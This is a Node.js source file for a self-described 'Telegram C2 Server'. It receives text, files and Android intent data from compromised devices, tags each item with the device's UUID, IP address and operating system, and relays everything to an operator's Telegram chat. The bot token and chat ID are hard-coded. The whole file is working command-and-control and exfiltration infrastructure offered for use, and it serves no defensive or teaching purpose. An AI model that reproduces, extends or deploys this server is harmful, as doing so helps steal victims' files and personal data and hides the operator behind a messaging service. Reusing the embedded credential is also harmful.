// =============================================================
// TELEGRAM C2 SERVER (Full Data Forwarding)
// =============================================================
require('dotenv').config();
const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const FormData = require('form-data');
const app = express();
const PORT = process.env.PORT || 3000;

// =============================================================
// CONFIGURATION (Use your provided credentials)
// =============================================================
const TELEGRAM_BOT_TOKEN = '7561698582:AAFhMEKlCgKx136YBZ-p_f4Glg-cpzsQsyQ';
const TELEGRAM_CHAT_ID = '6837315281';
const UPLOAD_DIR = path.join(__dirname, 'uploads');
const MAX_FILE_SIZE = 50 * 1024 * 1024; // 50MB

// Create directories if they don't exist
if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR, { recursive: true });

// =============================================================
// MIDDLEWARE
// =============================================================
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// File upload configuration
const storage = multer.diskStorage({
 destination: (req, file, cb) => {
 const dir = path.join(UPLOAD_DIR, req.body.uuid || 'unknown');
 if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
 cb(null, dir);
 },
 filename: (req, file, cb) => {
 const ext = path.extname(file.originalname);
 const name = path.basename(file.originalname, ext);
 cb(null, `${name}_${Date.now()}${ext}`);
 }
});

const upload = multer({
 storage: storage,
 limits: { fileSize: MAX_FILE_SIZE }
});

// =============================================================
// TELEGRAM BOT FUNCTIONS
// =============================================================
async function sendTelegramMessage(text) {
 try {
 // Split long messages into chunks of 4000 characters (Telegram limit)
 const chunks = [];
 for (let i = 0; i < text.length; i += 4000) {
 chunks.push(text.substring(i, i + 4000));
 }

 for (const chunk of chunks) {
 await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
 chat_id: TELEGRAM_CHAT_ID,
 text: chunk,
 parse_mode: 'HTML',
 disable_web_page_preview: true
 });
 }
 } catch (error) {
 console.error('Telegram Error:', error.message);
 }
}

async function sendTelegramDocument(filePath, caption = '') {
 try {
 const form = new FormData();
 form.append('chat_id', TELEGRAM_CHAT_ID);
 form.append('document', fs.createReadStream(filePath));
 form.append('caption', caption);

 await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, form, {
 headers: form.getHeaders(),
 maxContentLength: Infinity,
 maxBodyLength: Infinity
 });
 } catch (error) {
 console.error('Telegram Document Error:', error.message);
 }
}

// =============================================================
// HELPER FUNCTIONS
// =============================================================
function getDeviceInfo(req) {
 return {
 uuid: req.body.uuid || req.query.uuid || 'unknown',
 ip: req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress,
 userAgent: req.headers['user-agent'],
 os: getOS(req.headers['user-agent']),
 timestamp: new Date().toISOString()
 };
}

function getOS(userAgent) {
 if (/Android/i.test(userAgent)) return 'Android';
 if (/iPhone|iPad|iPod/i.test(userAgent)) return 'iOS';
 if (/Windows/i.test(userAgent)) return 'Windows';
 if (/Macintosh|Mac OS X/i.test(userAgent)) return 'macOS';
 if (/Linux/i.test(userAgent)) return 'Linux';
 return 'Unknown';
}

// =============================================================
// API ENDPOINTS
// =============================================================

// Receive text data (full content)
app.post('/uploadText', async (req, res) => {
 try {
 const deviceInfo = getDeviceInfo(req);
 const { label, data } = req.body;

 // Format the message for Telegram
 let message = `<b>📡 NEW DATA FROM DEVICE</b>\n\n`;
 message += `<b>🆔 UUID:</b> <code>${deviceInfo.uuid}</code>\n`;
 message += `<b>🌐 IP:</b> <code>${deviceInfo.ip}</code>\n`;
 message += `<b>💻 OS:</b> <code>${deviceInfo.os}</code>\n`;
 message += `<b>📅 Time:</b> <code>${deviceInfo.timestamp}</code>\n`;
 message += `<b>🏷️ Type:</b> <code>${label}</code>\n\n`;
 message += `<b>📄 DATA:</b>\n<pre>${JSON.stringify(data, null, 2)}</pre>`;

 // Send to Telegram
 await sendTelegramMessage(message);
 res.status(200).send('OK');
 } catch (error) {
 console.error('Error:', error);
 res.status(500).send('Error');
 }
});

// Receive files (full content)
app.post('/upload', upload.single('file'), async (req, res) => {
 try {
 const deviceInfo = getDeviceInfo(req);
 const file = req.file;

 if (!file) {
 return res.status(400).send('No file uploaded');
 }

 // Format the message for Telegram
 let message = `<b>📁 NEW FILE FROM DEVICE</b>\n\n`;
 message += `<b>🆔 UUID:</b> <code>${deviceInfo.uuid}</code>\n`;
 message += `<b>🌐 IP:</b> <code>${deviceInfo.ip}</code>\n`;
 message += `<b>💻 OS:</b> <code>${deviceInfo.os}</code>\n`;
 message += `<b>📅 Time:</b> <code>${deviceInfo.timestamp}</code>\n`;
 message += `<b>📄 File:</b> <code>${file.originalname}</code>\n`;
 message += `<b>📏 Size:</b> <code>${(file.size / 1024 / 1024).toFixed(2)} MB</code>\n`;
 message += `<b>📁 Path:</b> <code>${file.path}</code>`;

 // Send notification to Telegram
 await sendTelegramMessage(message);

 // Send the file to Telegram
 await sendTelegramDocument(file.path, `File from ${deviceInfo.uuid}`);

 res.status(200).send('OK');
 } catch (error) {
 console.error('Error:', error);
 res.status(500).send('Error');
 }
});

// Receive Android intent data
app.post('/android_data', async (req, res) => {
 try {
 const deviceInfo = getDeviceInfo(req);
 const { sources } = req.body;

 let message = `<b>🤖 ANDROID DATA FROM DEVICE</b>\n\n`;
 message += `<b>🆔 UUID:</b> <code>${deviceInfo.uuid}</code>\n`;
 message += `<b>🌐 IP:</b> <code>${deviceInfo.ip}</code>\n`;
 message += `<b>💻 OS:</b> <code>${deviceInfo.os}</code>\n`;
 message += `<b>📅 Time:</b> <code>${deviceInfo.timestamp}</code>\n\n`;
 message += `<b>📂 SOURCES (${sources.length}):</b>\n`;

 for (const source of sources) {
 message += `- <code>${source}</code>\n`;
 }

 await sendTelegramMessage(message);
 res.status(200).send('OK');
 } catch (error) {
 console.error('Error:', error);
 res.status(500).send('Error');
 }
});

// =============================================================
// START SERVER
// =============================================================
app.listen(PORT, () => {
 console.log(`🚀 C2 Server running on http://localhost:${PORT}`);
 sendTelegramMessage(`🚀 <b>C2 Server Started</b>\nPort: <code>${PORT}</code>`);
});
